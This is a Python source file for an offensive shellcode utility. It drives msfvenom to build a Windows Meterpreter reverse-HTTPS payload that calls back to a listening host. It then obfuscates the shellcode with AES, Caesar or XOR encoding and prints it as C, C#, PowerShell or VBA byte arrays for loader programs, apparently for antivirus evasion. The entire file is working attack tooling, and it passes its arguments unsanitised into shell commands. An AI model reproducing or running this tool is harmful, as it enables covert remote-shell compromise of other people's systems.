#!/usr/bin/env python3
import argparse
from os import system
from sys import exit,argv
from textwrap import dedent
from Crypto.Cipher import AES
from termcolor import colored
from colorama import Fore, Style
from Crypto.Util.Padding import pad
from subprocess import Popen, PIPE


def print_warning(msg):
    print(colored(f"[!] {msg}", "yellow", attrs=["bold"]))

def print_success(msg):
    print(colored(f"[+] {msg}", "green", attrs=["bold"]))

def print_fail(msg):
    print(colored(f"[-] {msg}", "red", attrs=["bold"]))

def print_info(msg):
    print(colored(f"[*] {msg}", "cyan", attrs=["bold"]))

def print_banner():
    print(Fore.GREEN + Style.BRIGHT + "")
    print(""" 
      _          _ _               _                       
     | |        | | |             | |                      
  ___| |__   ___| | | ___ ___   __| | ___ _ __ _ __  _   _ 
 / __| '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \ '__| '_ \| | | |
 \__ \ | | |  __/ | | (_| (_) | (_| |  __/ |_ | |_) | |_| |
 |___/_| |_|\___|_|_|\___\___/ \__,_|\___|_(_)| .__/ \__, |
                                              | |     __/ |
                                              |_|    |___/ 

    """)
    print("                                     v1.0   @rootshooter\n")
    print(" " + Style.RESET_ALL)

# use msfvenom to generate a raw shellcode file with the appropriate values
def gen_sc():
    try:
        lhost = args.lhost.lower()
        lport = args.lport.lower()
        payload = args.type.lower()
        outfile = args.outfile.lower()
        cmd = f"/usr/bin/msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f raw -o {outfile}"
        check = f"ls {outfile} 1>/dev/null"
        print_warning("Generating shellcode file")
        Popen([cmd], shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE).communicate()
        exe = system(check)
        if exe != "":
            print_success("Generation complete!")
            print_success(f"Shellcode output: {outfile}")
        else:
            print_fail("Error generating shellcode")
    except Exception as error:
        print_fail(error)

# read raw shellcode file and return the content to a function
def read_sc(sc_file):
    try:
        with open(sc_file, 'rb') as sc:
            content = sc.read()
        return content
    except Exception as error:
        print_fail(error)

# add aes-128 decryption routine (with key) to shellcode runner
# perform aes-128 encryption with the specified 16-character key value
def aes_encrypt():
    try:
        raw_sc = args.infile
        key = args.key
        if len(key) != 16:
            print_fail("Key length error!")
            exit()
        else:
            cipher = AES.new(key.encode("utf8"), AES.MODE_ECB)
            global crypt
            crypt = cipher.encrypt(pad(read_sc(raw_sc), 128))
    except Exception as error:
        print_fail(error)
        exit()

# change caesar shift value to match shellcode runner decoding
# perform caesar shift 13 places (caesar-13) with bitwise AND to key value within 0-255
def caesar_shift():
    try:
        raw_sc = args.infile
        raw_shell = bytearray(read_sc(raw_sc))
        for i in range(len(raw_shell)):
            raw_shell[i] = ((raw_shell[i] + 13) & 0xff)
        global crypt
        crypt = raw_shell
    except Exception as error:
        print_fail(error)
        exit()

# change xor key to match shellcode runner decoding
# perform xor of shellcode with key value 0x3c with bitwise AND to key value within 0-255
def xor_encode():
    try:
        raw_sc = args.infile
        raw_shell = bytearray(read_sc(raw_sc))
        for i in range(len(raw_shell)):
            raw_shell[i] = ((raw_shell[i] ^ 0x3c) & 0xff)
        global crypt
        crypt = raw_shell
    except Exception as error:
        print_fail(error)
        exit()

# print aes encrypted shellcode in clang usable format
def clang_aes(buf):
    chars = 40
    char_count = 0
    print_success("Here is your AES encrypted shellcode!\n")
    print(f"unsigned char buf[] = \n\"", end = "")
    for i in buf:
        char_count += 1
        print(""+"\\x"+i.to_bytes(1, "little").hex(), end = "")
        if (char_count % chars == 0):
            char_count = 0
            print("\"")
            print("\"", end = "")
    print("\";\n")
    print_success(f"buf size: {len(buf)}")

# print caesar shifted shellcode in clang usable format
def clang_caesar(buf):
    chars = 40
    char_count = 0
    print_success("Here is your Caesar shifted shellcode!\n")
    print(f"unsigned char buf[] = \n\"", end = "")
    for i in buf:
        char_count += 1
        print(""+"\\x"+i.to_bytes(1, "little").hex(), end = "")
        if (char_count % chars == 0):
            char_count = 0
            print("\"")
            print("\"", end = "")
    print("\";\n")
    print_success(f"buf size: {len(buf)}")

# print xor encoded shellcode in clang usable format
def clang_xor(buf):
    chars = 40
    char_count = 0
    print_success("Here is your XOR encoded shellcode!\n")
    print(f"unsigned char buf[] = \n\"", end = "")
    for i in buf:
        char_count += 1
        print(""+"\\x"+i.to_bytes(1, "little").hex(), end = "")
        if (char_count % chars == 0):
            char_count = 0
            print("\"")
            print("\"", end = "")
    print("\";\n")
    print_success(f"buf size: {len(buf)}")

# print aes encrypted shellcode in csharp usable format
def csharp_aes(buf):
    chars = 20
    char_count = 0
    str = "" 
    str += f"byte[] buf = new byte[{len(buf)}] {{ \n"
    for i in buf:
        char_count += 1
        str += "0x"+i.to_bytes(1, "little").hex()+","
        if (char_count % chars == 0):
            char_count = 0
            str += "\n"
    str = str[:-2]
    print_success("Here is your AES encrypted shellcode!")
    print_success(f"buf size: {len(buf)}\n")
    print(f"{str} }};", end = "")

# print caesar shifted shellcode in csharp usable format
def csharp_caesar(buf):
    chars = 20
    char_count = 0
    str = "" 
    str += f"byte[] buf = new byte[{len(buf)}] {{ \n"
    for i in buf:
        char_count += 1
        str += "0x"+i.to_bytes(1, "little").hex()+","
        if (char_count % chars == 0):
            char_count = 0
            str += "\n"
    str = str[:-2]
    print_success("Here is your Caesar shifted shellcode!")
    print_success(f"buf size: {len(buf)}\n")
    print(f"{str} }};", end = "")

# print xor encoded shellcode in csharp usable format
def csharp_xor(buf):
    chars = 20
    char_count = 0
    str = "" 
    str += f"byte[] buf = new byte[{len(buf)}] {{ \n"
    for i in buf:
        char_count += 1
        str += "0x"+i.to_bytes(1, "little").hex()+","
        if (char_count % chars == 0):
            char_count = 0
            str += "\n"
    str = str[:-2]
    print_success("Here is your XOR encoded shellcode!")
    print_success(f"buf size: {len(buf)}\n")
    print(f"{str} }};", end = "")

# print aes encrypted shellcode in powershell usable format
def ps1_aes(buf):
    chars = 40
    char_count = 0
    str = ""
    str += "[Byte[]] $buf = "
    for i in buf:
        char_count += 1
        str += ""+"0x"+i.to_bytes(1, "little").hex()+","
        if (char_count % chars == 0):
            char_count = 0
    str = str[:-1]
    print_success("Here is your AES encrypted shellcode!")
    print_success(f"buf size: {len(buf)}\n")
    print(f"{str}", end = "")

# print caesar shifted shellcode in powershell usable format
def ps1_caesar(buf):
    chars = 40
    char_count = 0
    str = ""
    str += "[Byte[]] $buf = "
    for i in buf:
        char_count += 1
        str += ""+"0x"+i.to_bytes(1, "little").hex()+","
        if (char_count % chars == 0):
            char_count = 0
    str = str[:-1]
    print_success("Here is your Caesar shifted shellcode!")
    print_success(f"buf size: {len(buf)}\n")
    print(f"{str}", end = "")

# print xor encoded shellcode in powershell usable format
def ps1_xor(buf):
    chars = 40
    char_count = 0
    str = ""
    str += "[Byte[]] $buf = "
    for i in buf:
        char_count += 1
        str += ""+"0x"+i.to_bytes(1, "little").hex()+","
        if (char_count % chars == 0):
            char_count = 0
    str = str[:-1]
    print_success("Here is your XOR encoded shellcode!")
    print_success(f"buf size: {len(buf)}\n")
    print(f"{str}", end = "")

# print aes encrypted shellcode in visual basic usable format
def vba_aes(buf):
    chars = 50
    char_count = 0
    str = ""
    str += "buf = Array("
    for i in buf:
        char_count +=1
        str += "%d," % (i)
        if (char_count % chars == 0):
            char_count=0
            str += " _\n"
    str = str[:-1]
    str += ")"
    print_success("Here is your AES encrypted shellcode!")
    print_success(f"buf size: {len(buf)}\n")
    print(f"{str}", end = "")

# print caesar shifted shellcode in visual basic usable format
def vba_caesar(buf):
    chars = 50
    char_count = 0
    str = ""
    str += "buf = Array("
    for i in buf:
        char_count +=1
        str += "%d," % (i)
        if (char_count % chars == 0):
            char_count=0
            str += " _\n"
    str = str[:-1]
    str += ")"
    print_success("Here is your Caesar shifted shellcode!")
    print_success(f"buf size: {len(buf)}\n")
    print(f"{str}", end = "")

# print xor encoded shellcode in visual basic usable format
def vba_xor(buf):
    chars = 50
    char_count = 0
    str = ""
    str += "buf = Array("
    for i in buf:
        char_count +=1
        str += "%d," % (i)
        if (char_count % chars == 0):
            char_count=0
            str += " _\n"
    str = str[:-1]
    str += ")"
    print_success("Here is your XOR encoded shellcode!")
    print_success(f"buf size: {len(buf)}\n")
    print(f"{str}", end = "")

# main execution control for the program
def main():
    print_banner()
    if args.generate == True:
        gen_sc()
    elif args.encoder.lower() == "clang_aes":
        aes_encrypt()
        clang_aes(crypt)
    elif args.encoder.lower() == "clang_caesar":
        caesar_shift()
        clang_caesar(crypt)
    elif args.encoder.lower() == "clang_xor":
        xor_encode()
        clang_xor(crypt)
    elif args.encoder.lower() == "csharp_aes":
        aes_encrypt()
        csharp_aes(crypt)
    elif args.encoder.lower() == "csharp_caesar":
        caesar_shift()
        csharp_caesar(crypt)
    elif args.encoder.lower() == "csharp_xor":
        xor_encode()
        csharp_xor(crypt)
    elif args.encoder.lower() == "ps1_aes":
        aes_encrypt()
        ps1_aes(crypt)
    elif args.encoder.lower() == "ps1_caesar":
        caesar_shift()
        ps1_caesar(crypt)
    elif args.encoder.lower() == "ps1_xor":
        xor_encode()
        ps1_xor(crypt)
    elif args.encoder.lower() == "vba_aes":
        aes_encrypt()
        vba_aes(crypt)
    elif args.encoder.lower() == "vba_caesar":
        caesar_shift()
        vba_caesar(crypt)
    elif args.encoder.lower() == "vba_xor":
        xor_encode()
        vba_xor(crypt)
    else:
        print_fail("Invalid encoder!")
        exit()

# define program options and program execution
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Shellcode generation and encoding utility", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent(f'''

    encoder types:
      clang_aes
      clang_caesar
      clang_xor
      csharp_aes
      csharp_caesar
      csharp_xor
      ps1_aes
      ps1_caesar
      ps1_xor
      vba_aes
      vba_caesar
      vba_xor

'''))

    parser.add_argument('-e', '--encoder', help='Payload encoder format')
    parser.add_argument('-k', '--key', default='Sup3rPassw0rdbR0', help='16 character (a-z A-Z 1-9) key for AES encryption')
    parser.add_argument('-i', '--infile', default='/tmp/raw_sc', help='Raw shellcode input file (default: tmp/raw_sc)')
    parser.add_argument('-l', '--lhost', default='tun0', help='Listening host address for msfvenom payload (default: tun0)')
    parser.add_argument('-p', '--lport', default='443', help='Listening port for msfvenom payload (default: 443)')
    parser.add_argument('-t', '--type', default='windows/x64/meterpreter/reverse_https', help='Payload format (default: windows/x64/meterpreter/reverse_https)')
    parser.add_argument('-o', '--outfile', default='/tmp/raw_sc', help='Raw shellcode output file (default: tmp/raw_sc)')
    parser.add_argument('-g', '--generate', action='store_true', help='Generate msfvenom shellcode. Must specify: -l, -p, -t')
    global args
    args = parser.parse_args()
    if len(argv) == 1:
        parser.print_help()
        parser.exit()
    else:
        main()
